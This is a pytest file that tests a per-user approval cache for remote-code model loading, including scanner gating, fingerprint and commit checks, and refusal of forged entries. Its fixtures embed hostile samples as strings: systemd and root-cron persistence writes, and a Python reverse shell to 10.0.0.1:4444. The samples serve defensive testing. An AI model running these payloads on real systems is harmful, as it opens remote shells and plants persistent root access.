# SPDX-License-Identifier: AGPL-3.0-only
# Copyright 2026-present the Unsloth AI Inc. team. All rights reserved. See /studio/LICENSE.AGPL-3.0

"""Tests for the persistent per-user trust_remote_code approval cache.

The cache skips only the DIALOG, never the scan: every load re-scans (CRITICAL always
blocked), and a stored approval just seeds the authoritative fingerprint check. The scanner
and fingerprint run for real; only the config/file fetch and commit-SHA lookup are stubbed.
"""

import pytest

import utils.security.consent as consent
import utils.security.remote_code_approvals as approvals
from utils.security import evaluate_remote_code_consent_for_targets

# HIGH (approvable) is the interesting case: benign code never prompts and CRITICAL is never
# approvable, so the cache that skips the prompt only matters for blockable-but-approvable.
_HIGH = {
    "modeling_persist.py": (
        "open('/etc/systemd/system/x.service', 'w').write('[Service]\\nExecStart=sh')\n"
    )
}
_HIGH2 = {  # a different HIGH payload -> different fingerprint
    "modeling_persist.py": (
        "open('/etc/cron.d/x', 'w').write('* * * * * root sh -c id')\n"
    )
}
_CRITICAL = {
    "modeling_evil.py": (
        "import socket, subprocess, os\n"
        "s = socket.socket(); s.connect(('10.0.0.1', 4444))\n"
        "os.dup2(s.fileno(), 0); subprocess.call(['/bin/sh', '-i'])\n"
    )
}


@pytest.fixture(autouse = True)
def _isolated_store(tmp_path, monkeypatch):
    """Point the store at a tmp file and start each test with a clean cache."""
    monkeypatch.setattr(approvals, "_store_path", lambda: tmp_path / "approvals.json")
    monkeypatch.delenv("UNSLOTH_TRC_APPROVAL_CACHE_DISABLE", raising = False)
    yield


def _patch_scan(
    monkeypatch,
    files,
    sha = "sha1",
):
    """Stub the gate's scanners and the SHA resolver; return a {'scans': n} counter."""
    state = {"scans": 0}

    def _files(target, hf_token = None):
        state["scans"] += 1
        return dict(files)

    monkeypatch.setattr(consent, "_config_has_auto_map", lambda *a, **k: True)
    monkeypatch.setattr(consent, "repo_remote_code_files", _files)
    monkeypatch.setattr(approvals, "resolve_commit_sha", lambda t, hf = None: sha)
    return state


def _gate(
    targets,
    *,
    approved = None,
    subject = "user-a",
):
    return evaluate_remote_code_consent_for_targets(
        targets if isinstance(targets, list) else [targets],
        None,
        trust_remote_code = True,
        approved_fingerprint = approved,
        subject = subject,
    )


def _approve(
    monkeypatch,
    target = "org/m",
    files = _HIGH,
    sha = "sha1",
    subject = "user-a",
):
    """Drive a genuine approval (scan -> user supplies the matching fingerprint -> record)."""
    st = _patch_scan(monkeypatch, files, sha = sha)
    fp = _gate(target, subject = subject).fingerprint  # blocked: no approval yet
    _gate(target, approved = fp, subject = subject)  # explicit approval -> recorded
    return st, fp


# --- store API ---------------------------------------------------------------


def test_store_roundtrip_and_forget():
    approvals.record(
        "u",
        "k",
        commit_sha = "s",
        fingerprint = "f",
        max_severity = "HIGH",
        scanner_version = 1,
    )
    got = approvals.lookup("u", "k")
    assert got is not None and got.fingerprint == "f" and got.scanner_version == 1
    approvals.forget("u", "k")
    assert approvals.lookup("u", "k") is None


def test_file_lock_acquires_releases_and_reacquires():
    # Used around every store write; must acquire, release, and be re-acquirable (no leak).
    with approvals._file_lock():
        pass
    with approvals._file_lock():
        pass


def test_concurrent_records_do_not_lose_entries():
    # Many writers recording different keys must all survive the read-modify-write; the file
    # lock + re-read serialize them so none clobbers another (cross-process race fix).
    import threading

    def rec(i):
        approvals.record(
            "u", f"k{i}", commit_sha = "s", fingerprint = f"f{i}", max_severity = "HIGH"
        )

    threads = [threading.Thread(target = rec, args = (i,)) for i in range(20)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    for i in range(20):
        assert approvals.lookup("u", f"k{i}") is not None


def test_combined_sha_none_when_any_unresolvable(monkeypatch):
    monkeypatch.setattr(
        approvals,
        "resolve_commit_sha",
        lambda t, hf = None: None if t == "org/base" else "s",
    )
    assert approvals.resolve_combined_sha(["org/a", "org/base"]) is None
    assert approvals.resolve_combined_sha(["org/a"]) is not None


def test_resolve_commit_sha_local_and_offline_are_none(monkeypatch):
    monkeypatch.setattr("utils.paths.is_local_path", lambda t: t.startswith("/"))
    assert approvals.resolve_commit_sha("/local/model") is None
    monkeypatch.setattr(approvals, "_env_offline", lambda: True)
    assert approvals.resolve_commit_sha("org/remote") is None


def test_corrupt_store_is_ignored_then_rewritten():
    store = approvals._store_path()
    store.parent.mkdir(parents = True, exist_ok = True)
    store.write_text("{ not valid json")
    assert approvals.lookup("u", "k") is None  # no raise
    approvals.record("u", "k", commit_sha = "s", fingerprint = "f", max_severity = "HIGH")
    assert approvals.lookup("u", "k") is not None  # valid file rewritten


def test_malformed_store_shape_fails_safe():
    # Valid JSON + version but a non-dict shape (hand-edited) must fail safe (re-prompt),
    # never crash lookup/record/forget.
    store = approvals._store_path()
    store.parent.mkdir(parents = True, exist_ok = True)
    for bad in (
        '{"version": 1, "subjects": []}',
        '{"version": 1, "subjects": {"u": []}}',
    ):
        store.write_text(bad)
        assert approvals.lookup("u", "k") is None  # no raise
        approvals.forget("u", "k")  # no raise
        approvals.record("u", "k", commit_sha = "s", fingerprint = "f", max_severity = "HIGH")
        assert approvals.lookup("u", "k") is not None  # store healed


# --- gate integration: the cache skips the prompt, never the scan ------------


def test_cache_miss_prompts(monkeypatch):
    _patch_scan(monkeypatch, _HIGH)
    d = _gate("org/m")
    assert d.blocked is True and d.approvable is True
    assert approvals.lookup("user-a", approvals.approval_target_key(["org/m"])) is None


def test_unchanged_repo_skips_prompt_but_still_scans(monkeypatch):
    st, _ = _approve(monkeypatch)
    before = st["scans"]
    d = _gate(
        "org/m"
    )  # SHA + fingerprint match -> auto-approve, but the scan still runs
    assert d.blocked is False and d.reason == "approved by fingerprint"
    assert st["scans"] == before + 1  # cache never skips the scan


def test_sha_moved_forces_reprompt(monkeypatch):
    _approve(monkeypatch, sha = "sha1")
    monkeypatch.setattr(approvals, "resolve_commit_sha", lambda t, hf = None: "sha2")
    d = _gate(
        "org/m"
    )  # SHA moved -> seed withheld -> re-prompt even though code is identical
    assert d.blocked is True


def test_local_offline_uses_fingerprint_only(monkeypatch):
    # SHA unresolvable (local/offline): the fingerprint alone governs, so unchanged code
    # still auto-approves.
    _approve(monkeypatch, sha = None)
    d = _gate("org/m")
    assert d.blocked is False and d.reason == "approved by fingerprint"


def test_changed_code_same_sha_reprompts(monkeypatch):
    # Even with the primary SHA unchanged, changed executable code (e.g. an external
    # auto_map repo) changes the fingerprint, so the dialog returns.
    _approve(monkeypatch, files = _HIGH, sha = "sha1")
    monkeypatch.setattr(
        consent, "repo_remote_code_files", lambda t, hf_token = None: dict(_HIGH2)
    )
    d = _gate("org/m")
    assert d.blocked is True


def test_scanner_version_change_invalidates(monkeypatch):
    _approve(monkeypatch)  # recorded under the current SCANNER_VERSION
    monkeypatch.setattr(approvals, "SCANNER_VERSION", approvals.SCANNER_VERSION + 1)
    d = _gate("org/m")  # ruleset changed -> stored approval ignored -> re-prompt
    assert d.blocked is True


def test_critical_is_never_recorded(monkeypatch):
    _patch_scan(monkeypatch, _CRITICAL)
    fp = _gate("org/m").fingerprint
    d = _gate("org/m", approved = fp)  # CRITICAL is not approvable
    assert d.blocked is True and d.approvable is False
    assert approvals.lookup("user-a", approvals.approval_target_key(["org/m"])) is None


def test_forged_critical_store_entry_is_refused(monkeypatch):
    _patch_scan(monkeypatch, _CRITICAL)
    key = approvals.approval_target_key(["org/m"])
    approvals._save(
        {
            "version": 1,
            "subjects": {
                "user-a": {
                    key: {
                        "commit_sha": "org/m=sha1",
                        "fingerprint": "x",
                        "max_severity": "CRITICAL",
                        "scanner_version": approvals.SCANNER_VERSION,
                        "approved_at": "t",
                    }
                }
            },
        }
    )
    assert approvals.lookup("user-a", key) is None  # read guard refuses CRITICAL
    assert _gate("org/m").blocked is True  # scan still runs and blocks


def test_forged_downgraded_severity_still_blocks_critical(monkeypatch):
    # The store is editable JSON: forge a non-CRITICAL severity + the real fingerprint/SHA
    # for code that is actually CRITICAL. The scan still runs every load, so CRITICAL is
    # hard-blocked regardless of what the store claims.
    st = _patch_scan(monkeypatch, _CRITICAL, sha = "sha1")
    fp = _gate("org/m").fingerprint
    key = approvals.approval_target_key(["org/m"])
    approvals._save(
        {
            "version": 1,
            "subjects": {
                "user-a": {
                    key: {
                        "commit_sha": approvals.resolve_combined_sha(["org/m"]),
                        "fingerprint": fp,
                        "max_severity": "HIGH",  # forged downgrade
                        "scanner_version": approvals.SCANNER_VERSION,
                        "approved_at": "t",
                    }
                }
            },
        }
    )
    before = st["scans"]
    d = _gate("org/m")
    assert d.blocked is True and d.approvable is False
    assert st["scans"] == before + 1  # scanned despite the forged approval


def test_disable_flag_bypasses_cache(monkeypatch):
    _approve(monkeypatch)
    monkeypatch.setenv("UNSLOTH_TRC_APPROVAL_CACHE_DISABLE", "1")
    d = _gate("org/m")  # cache off -> no seed -> re-prompt
    assert d.blocked is True


def test_subject_isolation(monkeypatch):
    _approve(monkeypatch, subject = "user-a")
    assert (
        _gate("org/m", subject = "user-a").blocked is False
    )  # a: seeded -> auto-approve
    assert _gate("org/m", subject = "user-b").blocked is True  # b: still prompted


def test_combined_lora_key(monkeypatch):
    targets = ["org/adapter", "org/base"]
    _approve(monkeypatch, target = targets)
    assert _gate(targets).blocked is False  # combined key seeded
    assert _gate(["org/adapter"]).blocked is True  # adapter-only key misses


def test_no_subject_disables_cache(monkeypatch):
    st = _patch_scan(monkeypatch, _HIGH)
    fp = evaluate_remote_code_consent_for_targets(
        ["org/m"], None, trust_remote_code = True, subject = None
    ).fingerprint
    evaluate_remote_code_consent_for_targets(
        ["org/m"], None, trust_remote_code = True, approved_fingerprint = fp, subject = None
    )
    assert approvals.lookup("", approvals.approval_target_key(["org/m"])) is None
    # No subject -> nothing seeded -> still blocked next time.
    d = evaluate_remote_code_consent_for_targets(
        ["org/m"], None, trust_remote_code = True, subject = None
    )
    assert d.blocked is True
